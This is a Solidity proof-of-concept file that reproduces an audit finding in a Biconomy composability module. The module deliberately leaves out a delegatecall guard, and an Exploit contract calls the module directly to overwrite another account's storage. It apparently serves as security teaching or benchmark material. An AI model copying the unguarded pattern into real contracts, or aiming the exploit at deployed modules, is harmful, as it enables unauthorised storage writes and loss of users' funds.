// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Biconomy Composability — [C-01] Missing DelegateCall Check
    (Pashov Audit Group 2025-03, finding #63148)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: executeComposableDelegateCall is intended ONLY via
    CALLTYPE_DELEGATECALL from the smart account, but has no
    `require(THIS_ADDRESS != address(this))` guard. An attacker can call
    it directly on the module and execute arbitrary writeStorage (or any
    composed call) against shared Storage — corrupting account namespaces.
    Vulnerable unguarded entrypoint preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal shared Storage used by composability (namespace → slot → value).
contract StorageContract {
    mapping(bytes32 => mapping(bytes32 => bytes32)) private _store;

    function getNamespace(address account, address module) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(account, module));
    }

    function readStorage(bytes32 namespace, bytes32 slot) external view returns (bytes32) {
        return _store[namespace][slot];
    }

    function writeStorage(bytes32 slot, uint256 value, address account) external {
        // Real module derives namespace from (account, module); we key by account for the demo.
        bytes32 ns = keccak256(abi.encodePacked(account, msg.sender));
        _store[ns][slot] = bytes32(value);
    }

    /// @dev Read with explicit module address (for assertions after direct call).
    function readStorageFor(address account, address module, bytes32 slot) external view returns (bytes32) {
        bytes32 ns = keccak256(abi.encodePacked(account, module));
        return _store[ns][slot];
    }
}

/// @dev Minimal composed execution payload.
struct ComposableExecution {
    address to;
    uint256 value;
    bytes callData;
}

/// @notice Reduced ComposableExecutionModule with missing delegatecall guard.
/// Source: ComposableExecutionModule.executeComposableDelegateCall
/// (pashov/audits BiconomyComposability-security-review_2025-03-22).
contract ComposableExecutionModule {
    /// @dev Immutable deployment address — used by the FIX to detect direct calls.
    address private immutable THIS_ADDRESS;

    constructor() {
        THIS_ADDRESS = address(this);
    }

    /// @notice Intended only via account.execute(mode=delegatecall).
    /// It doesn't require access control as it is expected to be called by the
    /// account itself via .execute(mode = delegatecall).
    function executeComposableDelegateCall(ComposableExecution[] calldata executions) external {
        // FIX: require(THIS_ADDRESS != address(this), "NotAllowed");
        _executeComposable(executions); // @> VULN: missing require(THIS_ADDRESS != address(this)) — direct CALL allowed; attacker runs composed ops as the module
    }

    function _executeComposable(ComposableExecution[] calldata executions) internal {
        for (uint256 i = 0; i < executions.length; i++) {
            ComposableExecution calldata e = executions[i];
            (bool ok, bytes memory ret) = e.to.call{value: e.value}(e.callData);
            if (!ok) {
                assembly {
                    revert(add(ret, 0x20), mload(ret))
                }
            }
        }
    }

    /// @dev Exposed for the control test (FIX applied).
    function thisAddress() external view returns (address) {
        return THIS_ADDRESS;
    }
}

/// @notice Attacker calls executeComposableDelegateCall directly and overwrites storage.
/// CREATE order: storage (1), module (2).
contract Exploit {
    StorageContract public storageContract;
    ComposableExecutionModule public module;

    address public constant MOCK_ACCOUNT = address(0xACC0);
    bytes32 public constant SLOT_B = keccak256("SLOT_B");
    bytes32 public SLOT_B_0;

    bytes32 public valueBefore;
    bytes32 public valueAfter;

    constructor() {
        storageContract = new StorageContract(); // nonce 1
        module = new ComposableExecutionModule(); // nonce 2 — vulnerable
        SLOT_B_0 = keccak256(abi.encodePacked(SLOT_B, uint256(0)));
    }

    function run() external {
        // Previous slot B value (empty)
        valueBefore = storageContract.readStorageFor(MOCK_ACCOUNT, address(module), SLOT_B_0);
        require(valueBefore == bytes32(0), "pre");

        // Attacker (anyone) calls executeComposableDelegateCall DIRECTLY on the module —
        // not via smart-account delegatecall — and writes storage for MOCK_ACCOUNT.
        ComposableExecution[] memory executions = new ComposableExecution[](1);
        executions[0] = ComposableExecution({
            to: address(storageContract),
            value: 0,
            callData: abi.encodeWithSelector(
                StorageContract.writeStorage.selector,
                SLOT_B_0,
                uint256(420),
                MOCK_ACCOUNT
            )
        });

        // Direct call — no access control, no delegatecall check
        module.executeComposableDelegateCall(executions);

        valueAfter = storageContract.readStorageFor(MOCK_ACCOUNT, address(module), SLOT_B_0);
        require(valueAfter == bytes32(uint256(420)), "storage not corrupted");

        // Harm: unrestricted storage write via missing delegatecall guard.
        require(valueAfter != valueBefore && uint256(valueAfter) == 420, "harm not demonstrated");
    }
}
